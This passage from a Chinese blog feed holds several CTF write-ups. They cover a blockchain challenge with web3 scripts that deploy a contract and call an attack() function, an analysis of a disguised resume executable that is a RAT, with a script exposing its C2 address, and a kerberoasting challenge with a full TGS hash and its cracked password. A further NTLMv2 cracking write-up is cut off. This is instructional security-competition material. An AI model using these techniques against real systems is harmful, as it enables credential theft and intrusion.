class="string">&quot;0x2eca396F5474202720C4561c06ABcc0Bdd186E2c&quot;</span>)</span><br><span class="line">transaction = Bank.constructor(<span class="string">&quot;0xA86Cb9aCABb3E6629a47d676BEB38e2455B20917&quot;</span>).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(</span><br><span class="line">    transaction, private_key=<span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><figure><img src="/images/NepCTF2024-Writeup/image-20240827002114725.png"alt="image-20240827002114725" /><figcaption aria-hidden="true">image-20240827002114725</figcaption></figure><p>合约部署成功，接下来就是对合约中函数的调用。先将abi复制下来另存为一个名为Hack.abi的文件，注意要将abi中的所有单引号替换成双引号。</p><p>然后编写调用函数的脚本，先调用attack函数攻击获取ether，然后调用getflag函数输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://neptune-11192.nepctf.lemonprefect.cn&#x27;</span>))</span><br><span class="line">contract_address = <span class="string">&quot;0x40f60687B44C526775d40e53103C0cA745b260Fb&quot;</span> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Hack.abi&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    abi = json.load(f)</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line">value = w3.to_wei(<span class="number">5</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract.functions.attack().transact(&#123;<span class="string">&#x27;value&#x27;</span>: value&#125;)</span><br><span class="line">contract.functions.getflag().transact()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.flag().call())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/images/NepCTF2024-Writeup/image-20240827002735921.png"alt="image-20240827002735921" /><figcaption aria-hidden="true">image-20240827002735921</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Academic </tag>
            
            <tag> NepCTF </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2024初赛 Misc 简历复现</title>
      <link href="/posts/e0d398d8/"/>
      <url>/posts/e0d398d8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是被暴打的一集。。。跟上次京麒ctf一样，盯着下面这道misc看了一天，然后成功爆零。。。不想说什么了（T0T）</p><p>后来通过与<del>从某些途径搞来的</del>官方wp比对，发现——还是和上次京麒ctf一样，就差最后一步了。。。已经到了flag跟前，然后不会了。。。不说了，开始复现（T0T）</p></blockquote><h2 id="题目">题目</h2><p>题目给了一个叫做张小可 英语教师简历.png.exe的程序</p><h2 id="与答案相同部分">与答案相同部分</h2><p>先对这个程序进行查壳（这里改名为了1.exe）</p><p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819213235689.png" alt="image-20240819213235689" style="zoom: 67%;" /></p><p>upx脱壳</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819213332522.png"alt="image-20240819213332522" /><figcaption aria-hidden="true">image-20240819213332522</figcaption></figure><p>接下来的步骤正常应该是通过对1.exe逆向，来分析其进行的恶意行为。但是多捣鼓捣鼓也不难弄出来，下面就写我比赛时<del>瞎捣鼓</del>的做法了。</p><h2 id="我的方法">我的方法</h2><p>foremost分解1.exe，得到简历图片</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214026169.png"alt="image-20240819214026169" /><figcaption aria-hidden="true">image-20240819214026169</figcaption></figure><p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214120025.png" alt="image-20240819214120025" style="zoom:67%;" /></p><p>发现存在lsb隐写，得到一个网址</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214347437.png"alt="image-20240819214347437" /><figcaption aria-hidden="true">image-20240819214347437</figcaption></figure><p>直接访问，下载得到一个default.a文件</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214517377.png"alt="image-20240819214517377" /><figcaption aria-hidden="true">image-20240819214517377</figcaption></figure><p>拖进010</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214817604.png"alt="image-20240819214817604" /><figcaption aria-hidden="true">image-20240819214817604</figcaption></figure><p>可以看到其中存在大量的yyttddd，所以肯定是整体异或yyttddd（这里生成的文件命名为download.exe）</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819215052897.png"alt="image-20240819215052897" /><figcaption aria-hidden="true">image-20240819215052897</figcaption></figure><p>binwalk一下，得到一个叫做14728.7z的文件</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819221321688.png"alt="image-20240819221321688" /><figcaption aria-hidden="true">image-20240819221321688</figcaption></figure><p>7zip识别不出来，用trid识别一下，应该是个lzma压缩文件，改一下后缀</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819221534911.png"alt="image-20240819221534911" /><figcaption aria-hidden="true">image-20240819221534911</figcaption></figure><p>当时比赛的时候我就是卡在这儿了。。。</p><p>实际上，只要写个python脚本加载一下数据就行了。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;14728.lzma&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = pylzma.decompress(data)</span><br><span class="line">tmp = marshal.loads(data)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819221819896.png"alt="image-20240819221819896" /><figcaption aria-hidden="true">image-20240819221819896</figcaption></figure><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p><h2 id="预期方法后半部分">预期方法（后半部分）</h2><p>前面已经说过了，到异或yyttddd其实都可以通过对1.exe进行逆向推出来，因此这里就不说了，从得到download.exe开始说。</p><p>我们将download.exe丢进virustotal分析一下可以发现这其实是一个pupyrat的马</p><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819223954231.png"alt="image-20240819223954231" /><figcaption aria-hidden="true">image-20240819223954231</figcaption></figure><p>download.exe实际上后面跟着一个lzma格式的配置文件，提取出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;final.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">index = data.find(<span class="string">b&#x27;\x5d\x00\x00\x80\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LZMA signature not found, skipped&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = pylzma.decompress(data[index:])</span><br><span class="line">    tmp = marshal.loads(data)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819224318318.png"alt="image-20240819224318318" /><figcaption aria-hidden="true">image-20240819224318318</figcaption></figure><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 巅峰极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-Writeup</title>
      <link href="/posts/116da4e3/"/>
      <url>/posts/116da4e3/</url>
      
        <content type="html"><![CDATA[<h3 id="wrtieup点我"><ahref="https://www.blog.st4rr.top/writeups/MoeCTF2024Writeup.pdf">Wrtieup点我</a></h3>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024决赛 Misc kerberoasting复现</title>
      <link href="/posts/c9f9d9a0/"/>
      <url>/posts/c9f9d9a0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有幸跟着X1cT34m的学长们京东总部打了京麒CTF的决赛，结果我盯着下面这道misc题看了一天，然后爆零了(T0T)，队伍排名也不理想，给队里的师傅们磕一个了(T0T)。。。Orz</p><p>赛后我找了出题人，询问后发现，我最最开始得到的答案三问有两问是对的（这题总共有三个问题）。。。结果后面越改越离谱，错的那问仍然一直是错的。。。我还是再沉淀沉淀吧(</p><p>下面是对这题的复现</p></blockquote><p>题目给了一个流量包kerberoasting.pcapng，要求找出以下三问的答案，拼起来求md5值就是flag：</p><p>1、总共枚举到了几个kerberoastable的用户</p><p>2、攻击者得到的kerberoastable的用户的密码</p><p>3、攻击者通过kerberoasting攻击得到权限后进行了约束委派攻击，找出与服务端存在委派关系的用户名称</p><p>首先过滤一下ldap流，可以看到其中有一条查询请求查询到了4个用户</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240808152623844.png"alt="image-20240808152623844" /><figcaption aria-hidden="true">image-20240808152623844</figcaption></figure><p>进一步展开可以看到，这些用户都设置了SPN，因此可以判定他们就是kerberoastable的用户</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240808152809412.png"alt="image-20240808152809412" /><figcaption aria-hidden="true">image-20240808152809412</figcaption></figure><p>接下来过滤一下krb5流翻找，很快就可以看到这四个用户返回的TGS-REP</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240808153013132.png"alt="image-20240808153013132" /><figcaption aria-hidden="true">image-20240808153013132</figcaption></figure><p>展开可以看到返回的票据，其中可以找到enc-part的cipher部分，这一部分其实就是用户密码的hash值</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240808163841079.png"alt="image-20240808163841079" /><figcaption aria-hidden="true">image-20240808163841079</figcaption></figure><p>但是直接用这个值肯定是不行的，需要爆破需要有一定的格式，我们可以用下面的脚本去生成正确的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encType = <span class="string">&quot;23&quot;</span></span><br><span class="line">userName = <span class="string">&quot;&quot;</span></span><br><span class="line">domain = <span class="string">&quot;&quot;</span></span><br><span class="line">spn = <span class="string">&quot;&quot;</span></span><br><span class="line">cipherText = <span class="string">&quot;&quot;</span></span><br><span class="line">formatted_string = <span class="string">&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;</span>.<span class="built_in">format</span>(encType, userName, domain, spn, cipherText[:<span class="number">32</span>],</span><br><span class="line">                                                               cipherText[<span class="number">32</span>:])</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br></pre></td></tr></table></figure><p>对于用户VictoriaOrbit，我们可以得到如下的1.hash文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*VictoriaOrbit$WHOAMIANONY.COM$whoamianony.com/VictoriaOrbit*$4f5376a8c1190acb1dfb054d25a6e75d$c7a192b7cf3277dff22d0580cb58ea74b6d329823b8e2f0b6eb6cf6b9da5b02e4eb2c4c3aee69dfaff8d7c6d6fa6a7790b565d360864049e647164c51ea1840e5a9a9d14e046848a7e406ec2d2b35966b515b1a18d2805207b3142b6e160884a99e4b823682759d69ad4d83ab5eb3112997507c3deb60e035091aecd215684a719796b87b430d79b47e93a6b205ee42d2a74f3f0a5d2266fb6bc081e346b2f1fc15dc07b1bec60b02d03e9bbc1db72c1c4baa2d16c4f2d001d4fb43f881d1d4d8f1b768c18e01b925fb034d86020380c2cebce4bd0486c223f7f5acb065272c1f7dad806f10f940fbf916861395f766fec9b018a5456cd6a236c314fb8691698dc2c8f41c4ba496a5c33b2dcc97223c6f067c0f10b890668921b34f5d53f42f768086cb2466bd2e15bf18859064d1e7f7282513f5ddefa4dc5e03e29b3f040b35c2342ca833108a3ead9a515a29fd515c63696caedad27ff3de3ead2dbd20619ca743f2797d91a3f4a77a763c9cabf09106887c0d9f02c8a572cb5763c3cbd10e026a69e25b8953dfec41320f42928ae79df79afb8031201264d9c4d22ecc2aaddda2a249ebd1deb89948deb39b485b7870c103ffc667e803a2a2ea99c549274baa3b68d59e6e4865302ed4cd78887255584b91453185aefa3f98e95107c83a9891fc26332e5f2ba71b3f48af6e698176fb7e1304406d10c76343e2e7bc72c948ca93da839629d4f107fad8bc7b5a062fae5ef4f7afbe46862c61b8113bc9ec844d8638c4cebc6b0609d3ad4fb70042b537dba62b58ade791629e342a634e6906711c6e64360ae36aa479a7fcfa6cb3ef7725a74620ddcec820bc56b8975943bb9b89d9dec3a85e2159e15b3dbccfe3d44ef9e6c690287af61271f3250b983f5c266a45444e228e1409c537bb8c00a2cb416597305a0f16443028e6bd35126d77a759b353b4a082810ba4f19b0981dd28aa185628b3a4756b2ec3a39adbc1db2c3d4667b98d306fe668a2316d21029e5070c67fea7737bf174b9dac48f8bd717685c9623f595b0201504b416285b333f073da88d47f7af8ab74b712c08073fc34dabfdaa5d952c070e93e4303287ae420752633d4115caf697eaf75b06277601961476ad0b05ff2679259443486512c90d032945a1f8a3e6707af0e23b6958ea758fbaf46034cddc42a9f38f213806d96aecf6868f0dde4acc3c522c2e337af2215d7eebe0792d4b8151a221e9465bd49058551dc8023a036448b43aab5b8afc7a3615b4d39e97c3efdb455f11c36ddc1172e51a6fabda60573452b23c338d335a7d5b3a6f8cced00b83232331add275432e837b197cee6d095f6ae95e95107c50c0e1532b4445db8395f08594c0e4682d521c2580cdf1452426af7278a4e0dbbbba0d87a926c16249a0ff5976eb65d0ee6603803e57b7621d632f048a4cd5852acdb3be2860806efca2fb616c609ff6e383289c1a232df775992edbe8c7ee2f6915ab8d807d41f00a6618062a2425b40421c45a1eae5d86af38b8</span><br></pre></td></tr></table></figure><p>接下来就是经典操作，用工具john theripper，字典rockyou.txt进行爆破，得到明文密码4xVictoriax4</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240809000422154.png"alt="image-20240809000422154" /><figcaption aria-hidden="true">image-20240809000422154</figcaption></figure><p>最后就是找存在委派关系的用户，当时比赛时我就是卡在这里了。。。然而事实上这很简单。。。</p><p>还是过滤ldap流，查看msDS-AllowedToDelegatedTo的部分，即可找到用户名WIN-CORP16</p><figure><imgsrc="/images/jqctf2024决赛-Misc-kerberoasting复现/image-20240809001029442.png"alt="image-20240809001029442" /><figcaption aria-hidden="true">image-20240809001029442</figcaption></figure><p>所以最终答案是4_4xVictoriax4_WIN-CORP16</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学AI</title>
      <link href="/posts/780f3936/"/>
      <url>/posts/780f3936/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单学点AI，防止以后CTF中遇到AI就寄。。。</p><p>本文内容多为搬运+修补，所搬运文章链接在文末</p></blockquote><h2 id="朴素感知机神经元">朴素感知机、神经元</h2><p>感知机接收多个输入信号，输出一个信号。感知机的信号只有“流 /不流”（1/0）两种取值。这里我们认为 0 对应“不传递信号”， 1对应“传递信号”。最简单的感知机就是将输入进行处理得到中间结果，再将结果经过非线性函数处理输出。一般的，我们也把上述的模型称为<strong>神经元</strong>，又称作<strong>节点</strong>(node)或<strong>单元</strong>(unit)。</p><h2 id="神经网络">神经网络</h2><p>由多个神经元可组成<strong>神经网络</strong>。每个节点可以从其他节点接收输入，或者从外部源接收输入，然后计算输出。每个输入都各自的<strong>权重</strong>（weight，即w），用于调节该输入对输出影响的大小，节点的结构如图所示：</p><figure><img src="/images/浅学AI/image-20240731212540830.png"alt="image-20240731212540830" /><figcaption aria-hidden="true">image-20240731212540830</figcaption></figure><p>其中 x1, x2 作为该节点的输入，其权重分别为 w1 和w2。同时，还有配有<strong>偏置</strong>b（bias）的输入，偏置的主要功能是为每一个节点提供可训练的常量值（在节点接收的正常输入以外）。</p><h2 id="多层感知机">多层感知机</h2><p>多层感知机（Multilayer Perceptron）缩写为MLP，也称作前馈神经网络（Feedforward NeuralNetwork）。它是一种基于神经网络的机器学习模型，通过多层非线性变换对输入数据进行高级别的抽象和分类。下图显示了一个最典型的MLP，它包括包括三层： <strong>输入层、隐层（全连接层）和输出层</strong>（全连接的意思就是：上一层的任何一个神经元与下一层的所有神经元都有连接）。</p><figure><img src="/images/浅学AI/v2-2110a4d62384a277ab700907e73e8721_b.gif"alt="动图" /><figcaption aria-hidden="true">动图</figcaption></figure><p>它的工作分为两部分:</p><ul><li><strong>前向传播</strong>：输入数据被馈送到输入层，然后传递到隐藏层，并最终生成输出层的输出。每一层的每一个神经元都会计算其加权输入和非线性激活函数的输出。</li><li><strong>反向传播</strong>：在训练过程中，输出与期望的输出进行比较，产生一个误差值。这个误差随后被反向传播到网络中，权重得到相应的更新。</li></ul><h3 id="向前传播的计算">向前传播的计算</h3><p>让我们把上面的 MLP 细节化：</p><figure><img src="/images/浅学AI/v2-5a81c06789ad5e9323f93c6540263327_r.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在一般情况下，参与运算的各元素都是<strong>矩阵</strong>，其中的蓝色方块代表着<strong>激活函数</strong>，绿色方块代表着 <strong>权重 Weight</strong>和 <strong>偏置 Bias</strong> 。需要注意的是，*<strong>权重和偏置对应上图中不同神经元的连线*</strong>，例如 1-&gt; 3和 1-&gt; 4 的参数不同。详细计算方式如下图及下式：</p><figure><img src="/images/浅学AI/v2-ec822b0f10066f097a074e1ff09167b1_r.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在分类问题中，最后的输出层元素个数一般等于分类数目，最终的结果代表着该输入被这个MLP分为某一类的可能性大小，指越大，代表越可能属于该类。为了便于观测，我们通常使用softmax 函数将将上一层的原始数据进行归一化，转化为一个(0,1)(0,1)之间的数值，这些数值可以被当做概率分布，用来作为多分类的目标预测值。</p><figure><img src="/images/浅学AI/v2-4452fdaaa04686aa270010f57f4db2aa_r.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="激活函数">激活函数</h3><p>激活函数可为神经元引入非线性因素，使神经网络能够处理更复杂的问题。如果没有激活函数，那么神经网络将变为由一个巨大的线性组合构成。</p><h2 id="bp误差反向传播法">BP误差反向传播法</h2><p>反向传播算法的核心概念是：<strong>通过比较现实输出与期望输出之间的差异，根据差异来反向更新每一层的参数，从而使现实输出更加贴近于期望输出。</strong></p><p>损失对参数梯度的反向传播可以被这样直观解释：由 A 到传播 B，即由∂L/∂A∂L/∂A 得到 ∂L/∂B∂L/∂B ，由导数链式法则∂L/∂B=(∂L/∂A)⋅(∂A/∂B)∂L/∂B=(∂L/∂A)⋅(∂A/∂B)。所以神经网络的 BP就是通过链式法则求出L对所有参数梯度的过程。</p><p>如下图示例，输入x，经过网络的参数 w,b ，得到一系列中间结果 a,h 。</p><figure><img src="/images/浅学AI/v2-d38c136a7b018fb3ea7344a902d0e3d1_r.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下面是具体的推导公式</p><p>右上角的h21到a21: <span class="math display">\[\frac{\partial l}{\partial a_{21}}=\frac{\partial l}{\partialh_{21}}*\frac{\partial h_{21}}{\partial a_{21}}=\frac{\partiall}{\partial h_{21}}*activate&#39;(a_{21})\]</span> a21到h11: <span class="math display">\[L=f(a_{21},a_{22},a_{23})\frac{\partial L}{\partialh_{11}}=\frac{\partial L}{\partial a_{21}}\frac{\partiala_{21}}{\partial h_{11}}+\frac{\partial L}{\partiala_{22}}\frac{\partial a_{22}}{\partial h_{11}}+\frac{\partialL}{\partial a_{21}}\frac{\partial a_{21}}{\partialh_{11}}=\frac{\partial L}{\partial a_{21}}w_1+\frac{\partial L}{\partiala_{22}}w_2+\frac{\partial L}{\partial a_{23}}w_3\]</span></p><p><span class="math display">\[\frac{\partial L}{\partial w_1}=\frac{\partial L}{\partiala_{21}}\frac{\partial a_{21}}{\partial w_1}=\frac{\partial L}{\partiala_{21}}h_{11}\]</span></p><p><span class="math display">\[\frac{\partial L}{\partial b_{21}}=\frac{\partial L}{\partiala_{21}}\frac{\partial a_{21}}{\partial b_{21}}=\frac{\partialL}{\partial a_{21}}\]</span></p><p>因此，我们可以如下图，将反向传播的表达式如下。</p><figure><img src="/images/浅学AI/v2-4564c3328f7f007f2a046076cdac800a_r.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>当然并不是所有的反向传播都是如此即可，还有可能与向前传播时所用的激活函数有关，具体可查看<ahref="https://hello-ctf.com/HC_AI/MLP/#_11">原文</a></p><p>参考文章：</p><p><a href="https://hello-ctf.com/HC_AI/MLP/">传送门一</a></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024暑假偷偷练习CTF</title>
      <link href="/posts/e41c2619/"/>
      <url>/posts/e41c2619/</url>
      
        <content type="html"><![CDATA[<p>听说隔壁Dozer的f4k3r师傅校队有内部训练，偷偷过去玩了一下，这里放一下我和f4k3r师傅一起写的wp（未用于提交），方便以后查阅使用</p><p><ahref="https://f4k3r.top/2024/07/10/%E4%B8%8E%E5%8D%97%E8%88%AA%E7%9A%84%E6%9A%91%E6%9C%9F%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83WP/">传送门一</a></p><p><ahref="https://f4k3r.top/2024/07/28/%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83%E7%BB%93%E8%90%A5%E8%B5%9BWP/">传送门二</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第二题</title>
      <link href="/posts/c81e8560/"/>
      <url>/posts/c81e8560/</url>
      
        <content type="html"><![CDATA[<p>一个内存取证题，题目如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明在电脑上画了一幅图，这幅图的内容是什么，请提交其内容的md5值（32位小写）。</span><br></pre></td></tr></table></figure><p>经典起手式imageinfo</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104201276.png"alt="image-20240723104201276" /><figcaption aria-hidden="true">image-20240723104201276</figcaption></figure><p>既然要求我们找图片，那就直接filescan出所有png，jpg，bmp，gif后缀名的文件</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104602194.png"alt="image-20240723104602194" /><figcaption aria-hidden="true">image-20240723104602194</figcaption></figure><p>下面那个admin.bmp没法dump下来，上面这个jpg图片可以</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104804628.png"alt="image-20240723104804628" /><figcaption aria-hidden="true">image-20240723104804628</figcaption></figure><p>dump下来是这么一张图</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104828121.png"alt="image-20240723104828121" /><figcaption aria-hidden="true">image-20240723104828121</figcaption></figure><p>在乱翻cmd记录时看到他执行过这样一个命令</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105020025.png"alt="image-20240723105020025" /><figcaption aria-hidden="true">image-20240723105020025</figcaption></figure><p>看来他对这个字符串进行过Atbash，那么cyberchef启动</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105218652.png"alt="image-20240723105218652" /><figcaption aria-hidden="true">image-20240723105218652</figcaption></figure><p>要求提交的是md5值（32位小写）</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105317395.png"alt="image-20240723105317395" /><figcaption aria-hidden="true">image-20240723105317395</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第一题</title>
      <link href="/posts/c06ae389/"/>
      <url>/posts/c06ae389/</url>
      
        <content type="html"><![CDATA[<p>题目是给了一个pcapng文件，要求找出用户wangkai的明文密码（字典使用rockyou）。</p><p>打开pcapng文件，可以看到很多SMB2协议，看起来是几个用户在尝试登录账号，找到其中与wangkai有关的一条（可以用ntlmssp过滤，或者直接过滤smb2找起来也不麻烦）</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723101622388.png"alt="image-20240723101622388" /><figcaption aria-hidden="true">image-20240723101622388</figcaption></figure><p>接下来就是构造hash文件，先点开查看底下SMB2协议的报文</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723102229716.png"alt="image-20240723102229716" /><figcaption aria-hidden="true">image-20240723102229716</figcaption></figure><p>找到其中的相关信息，拼凑成如下格式：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:ntlmv2_response.chall:ntproofstr:不包含ntproofstr的ntlmv2_response值</span><br></pre></td></tr></table></figure><p>命名为abc.hash（名字随意，后缀是.hash即可），得到hash文件</p><p>但是这样拼凑比较复杂，而且这里的NTLMv2Response显示truncated，说明还得去其他地方找到剩余部分，比较麻烦。现有一自动化提取NTLMv2的工具，我们可以直接一把而梭之。</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723102916191.png"alt="image-20240723102916191" /><figcaption aria-hidden="true">image-20240723102916191</figcaption></figure><p>打开abc.hash，稍稍编辑一下，把其他用户的hash都删掉，只留一条wangkai的hash即可</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723103114511.png"alt="image-20240723103114511" /><figcaption aria-hidden="true">image-20240723103114511</figcaption></figure><figure><imgsrc="/images/星盟-2024-Misc-招新题-第一题/image-20240723103211205.png"alt="image-20240723103211205" /><figcaption aria-hidden="true">image-20240723103211205</figcaption></figure><p>接下来就是hashcat的事了，题目中给出了hint字典用rockyou。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 